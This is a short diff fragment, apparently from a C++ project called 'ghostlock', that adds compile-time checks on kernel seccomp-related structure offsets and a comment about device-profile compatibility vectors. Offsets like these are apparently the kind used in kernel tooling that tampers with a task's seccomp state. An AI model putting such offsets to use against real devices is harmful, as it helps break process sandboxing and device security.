++static_assert(ghostlock::kernel::SECCOMP_FILTER_OFF == 8);
++static_assert((ghostlock::kernel::TASK_SECCOMP_OFF % 8) == 0);
++
+ /* Compatibility vectors for target.h values deliberately left profile-owned.
+  * They prove CPP01 did not silently reinterpret device/kernel data as C++
+  * compile-time authority. */
